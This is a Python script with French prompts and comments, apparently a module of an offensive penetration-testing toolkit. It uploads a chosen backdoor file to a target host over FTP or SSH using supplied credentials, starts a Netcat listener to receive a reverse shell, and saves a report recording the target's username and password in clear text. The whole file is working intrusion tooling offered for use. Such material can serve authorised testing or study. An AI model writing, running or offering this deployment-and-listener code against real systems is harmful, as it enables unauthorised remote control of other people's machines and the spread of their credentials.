import ftplib
import paramiko
import os
import subprocess
import datetime

def list_backdoors():
    """Liste les backdoors disponibles dans le répertoire spécifié."""
    backdoors_dir = os.path.join(os.path.dirname(__file__), 'bibli_backdoor')
    backdoors = os.listdir(backdoors_dir)
    for idx, bd in enumerate(backdoors):
        print(f"{idx + 1}. {bd}")
    choice = int(input("Choisissez un fichier backdoor à déployer (numéro) : ")) - 1
    return os.path.join(backdoors_dir, backdoors[choice])

def deploy_backdoor_ftp(host, username, password, backdoor_path):
    """Déploie une backdoor via FTP."""
    try:
        with ftplib.FTP(host) as ftp:
            ftp.login(username, password)
            with open(backdoor_path, 'rb') as file:
                ftp.storbinary('STOR ' + os.path.basename(backdoor_path), file)
            print("Backdoor déployée avec succès via FTP.")
            ftp.quit()
            return True
    except Exception as e:
        print(f"Échec du déploiement via FTP: {e}")
        return False

def deploy_backdoor_ssh(host, username, password, backdoor_path):
    """Déploie une backdoor via SSH."""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=username, password=password)
        sftp = client.open_sftp()
        sftp.put(backdoor_path, '/' + os.path.basename(backdoor_path))
        sftp.close()
        client.close()
        print("Backdoor déployée avec succès via SSH.")
        return True
    except Exception as e:
        print(f"Échec du déploiement via SSH: {e}")
        return False

def start_listener(port):
    """Démarre un écouteur Netcat sur le port spécifié."""
    try:
        print(f"Démarrage de l'écoute sur le port {port}...")
        subprocess.run(['nc', '-lvnp', str(port)])
        return True
    except KeyboardInterrupt:
        print("Écoute interrompue manuellement.")
        return False
    except Exception as e:
        print(f"Erreur pendant l'écoute : {e}")
        return False

def create_report(report_name, host, service_choice, username, password, backdoor_path, listener_port, deployment_success, listening_success, chemin_rapports):
    """Crée un rapport de déploiement de la backdoor."""
    report_content = f"\n\n****************************************************************\n"
    report_content += f"Backdoor - {host} - {service_choice}\n"
    report_content += "****************************************************************\n"
    report_content += f"Rapport de déploiement de backdoor - {datetime.datetime.now()}\n"
    report_content += f"Service utilisé: {service_choice}\n"
    report_content += f"Hôte cible: {host}\n"
    report_content += f"Identifiant: {username}\n"
    report_content += f"Mot de passe: {password}\n"
    report_content += f"Fichier de backdoor déployé: {os.path.basename(backdoor_path)}\n"
    report_content += f"Port d'écoute: {listener_port}\n"
    report_content += f"Déploiement réussi: {'Oui' if deployment_success else 'Non'}\n"
    report_content += f"Écoute réussie: {'Oui' if listening_success else 'Non'}\n"
    chemin_complet = os.path.join(chemin_rapports, f"{report_name}.txt")
    with open(chemin_complet, "w") as file:
        file.write(report_content)
    print(f"Rapport enregistré sous {chemin_complet}")

def reverse_shell(chemin_rapports):
    """Injecte une backdoor sur la machine cible."""
    print("""
 ______  _______ _______ _     _ ______   _____   _____   ______                                                                                    
 |_____] |_____| |       |____/  |     \ |     | |     | |_____/                                                                                    
 |_____] |     | |_____  |    \_ |_____/ |_____| |_____| |    \_
 """)
    service_choice = input("Entrez le service à utiliser (ftp/ssh) : ")
    host = input("Entrez l'IP du serveur : ")
    username = input("Entrez le nom d'utilisateur : ")
    password = input("Entrez le mot de passe : ")
    listener_port = input("Entrez le port pour l'écoute de la backdoor : ")
    backdoor_path = list_backdoors()
    report_name = input("Entrez un nom pour le rapport : ")

    if service_choice.lower() == 'ftp':
        deployment_success = deploy_backdoor_ftp(host, username, password, backdoor_path)
    elif service_choice.lower() == 'ssh':
        deployment_success = deploy_backdoor_ssh(host, username, password, backdoor_path)
    else:
        print("Service non reconnu.")
        return

    listening_success = start_listener(listener_port)
    create_report(report_name, host, service_choice, username, password, backdoor_path, listener_port, deployment_success, listening_success, chemin_rapports)

if __name__ == "__main__":
    chemin_rapports = os.path.join(os.path.dirname(__file__), 'rapports')
    reverse_shell(chemin_rapports)
